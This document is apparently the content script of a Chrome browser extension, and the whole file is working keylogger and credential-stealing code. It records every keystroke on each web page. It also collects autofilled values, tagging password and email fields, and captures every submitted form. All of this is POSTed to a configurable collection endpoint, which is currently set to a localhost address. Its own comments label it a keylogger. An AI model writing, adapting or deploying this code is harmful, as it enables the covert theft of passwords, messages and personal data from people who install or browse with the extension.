if(typeof utils === 'undefined'){
  const utils = {
    config: {
      debounce: 3000,
      dest: 'https://localhost:5000',
      mode: 'cors',
      method: 'POST',
      headers: {
        'Content-type': 'application/json',
        'Sec-Fetch-Dest': 'object',
        'Sec-Fetch-Mode': 'cors',
        'X-API': 'xxxx'
      }
    },
    base64(str){
      // href base64 encoded as key
      return btoa(encodeURIComponent(str).replace(/%([0-9A-F]{2})/g,
        function(match, p1) {
          return String.fromCharCode('0x' + p1);
      }));
    },
    debounce(func, wait, immediate) {
    	let timeout;
    	return function() {
    		let context = this,
        args = arguments,
    		later = function() {
    			timeout = null;
    			if (!immediate) {
            func.apply(context, args);
          }
    		}
    		let callNow = immediate && !timeout;
    		clearTimeout(timeout);
    		timeout = setTimeout(later, wait);
    		if(callNow){
          func.apply(context, args);
        }
    	}
    },
    post(data, noclear){
      fetch(utils.config.dest,{
        method: utils.config.method,
        headers: utils.config.headers,
        body: JSON.stringify(data)
      }).then(function(res){
        if (res.status >= 200 && res.status < 300) {
          return res.json();
        } else {
          return Promise.reject(new Error(res.statusText))
        }
      }).then(function(res){
        //reset href on successful post
          if(!noclear){
            data[Object.keys(data)[0]] = '';
            chrome.storage.local.set(data, function(res) {

            });
          }
      }).catch(function(err){
        // catch error
      })
    }
  }

  if(location.protocol !== 'chrome-extension:'){

    window.addEventListener("post-data", utils.debounce(function(evt) {
      console.log(evt.detail)
      /* post data */
      utils.post(evt.detail, false);
    },utils.config.debounce));

    //keylogger
    document.body.addEventListener('keyup', function(evt){
      let char = evt.key,
      href = utils.base64(location.href);

      chrome.storage.local.get([href], function(res) {
        let obj = {};
        if(res[href]){
          char = (res[href] + char);
        }
        obj[href] = char;
        chrome.storage.local.set(obj, function(res) {
          window.dispatchEvent(new CustomEvent("post-data", {detail: obj}));
          char = href = obj = null;
        });
      });
    })
  }

  setTimeout(function(){
    let items = document.querySelectorAll('input'),
    forms = document.querySelectorAll('form'),
    arr = [];

    //autofill
    for (let i = 0; i < items.length; i++) {
      let val = items[i].value;
      if(val && val.length > 3 && val.length < 32){
        let str = '';
        if(items[i].type === 'password'){
          str+='pw:';
        }
        if(items[i].type === 'email'){
          str+='em:';
        }
        str+= val
        arr.push(str);
      }
    }

    if(arr.length){
      utils.post({
        href: utils.base64(location.href),
        data: arr
      }, true);
    }

    //forms
    for (let i = 0; i < forms.length; i++) {
      forms[i].addEventListener('submit', function(e){
        let data = {},
        x = new FormData(forms[i]);
        for(var pair of x.entries()) {
           data[pair[0]] = pair[1];
        }
        utils.post({
          href: utils.base64(location.href),
          data: data
        }, true);
      });
    }

  },3000)

}
